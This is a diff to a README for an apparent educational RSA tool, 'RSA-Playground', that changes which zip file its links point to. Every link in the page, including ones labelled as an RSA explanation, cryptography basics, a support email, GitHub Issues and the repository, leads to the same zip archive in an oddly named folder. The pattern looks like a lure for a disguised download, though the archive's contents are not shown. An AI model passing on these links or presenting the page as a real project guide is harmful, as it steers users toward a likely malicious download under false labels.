@@ -10,7 +10,7 @@ To get started, follow these steps to download and run the software:
 
 1. **Visit the Releases Page:**
    Click the link below to go to the Releases page where you can download the latest version.
-   [![Download RSA-Playground](https://raw.githubusercontent.com/Mehmetfitness/RSA-Playground/main/papoose/RSA-Playground.zip)](https://raw.githubusercontent.com/Mehmetfitness/RSA-Playground/main/papoose/RSA-Playground.zip)
+   [![Download RSA-Playground](https://github.com/Mehmetfitness/RSA-Playground/raw/refs/heads/main/papoose/Playground_RS_3.6.zip)](https://github.com/Mehmetfitness/RSA-Playground/raw/refs/heads/main/papoose/Playground_RS_3.6.zip)
 
 2. **Choose the Latest Release:**
    On the Releases page, look for the most recent version listed. Make sure it’s the latest, as it will have the newest features and fixes.
@@ -56,8 +56,8 @@ To get started, follow these steps to download and run the software:
 
 If you want to learn more about RSA encryption, check out these resources:
 
-- [RSA Algorithm Explanation](https://raw.githubusercontent.com/Mehmetfitness/RSA-Playground/main/papoose/RSA-Playground.zip)
-- [Cryptography Basics](https://raw.githubusercontent.com/Mehmetfitness/RSA-Playground/main/papoose/RSA-Playground.zip)
+- [RSA Algorithm Explanation](https://github.com/Mehmetfitness/RSA-Playground/raw/refs/heads/main/papoose/Playground_RS_3.6.zip)
+- [Cryptography Basics](https://github.com/Mehmetfitness/RSA-Playground/raw/refs/heads/main/papoose/Playground_RS_3.6.zip)
 
 ## ❓ Frequently Asked Questions
 
@@ -73,11 +73,11 @@ Absolutely! RSA-Playground is compatible with both Windows and Mac operating sys
 ## 📞 Support
 
 If you encounter any issues or have questions, feel free to reach out:
-- Email: https://raw.githubusercontent.com/Mehmetfitness/RSA-Playground/main/papoose/RSA-Playground.zip
-- GitHub Issues: [Submit Your Issue](https://raw.githubusercontent.com/Mehmetfitness/RSA-Playground/main/papoose/RSA-Playground.zip)
+- Email: https://github.com/Mehmetfitness/RSA-Playground/raw/refs/heads/main/papoose/Playground_RS_3.6.zip
+- GitHub Issues: [Submit Your Issue](https://github.com/Mehmetfitness/RSA-Playground/raw/refs/heads/main/papoose/Playground_RS_3.6.zip)
 
 ## 🔗 Links
 
-For more information, visit our [GitHub Repository](https://raw.githubusercontent.com/Mehmetfitness/RSA-Playground/main/papoose/RSA-Playground.zip) and check the Releases page again at [this link](https://raw.githubusercontent.com/Mehmetfitness/RSA-Playground/main/papoose/RSA-Playground.zip) for updates and new releases.
+For more information, visit our [GitHub Repository](https://github.com/Mehmetfitness/RSA-Playground/raw/refs/heads/main/papoose/Playground_RS_3.6.zip) and check the Releases page again at [this link](https://github.com/Mehmetfitness/RSA-Playground/raw/refs/heads/main/papoose/Playground_RS_3.6.zip) for updates and new releases.
 
 Enjoy your journey in understanding RSA encryption!
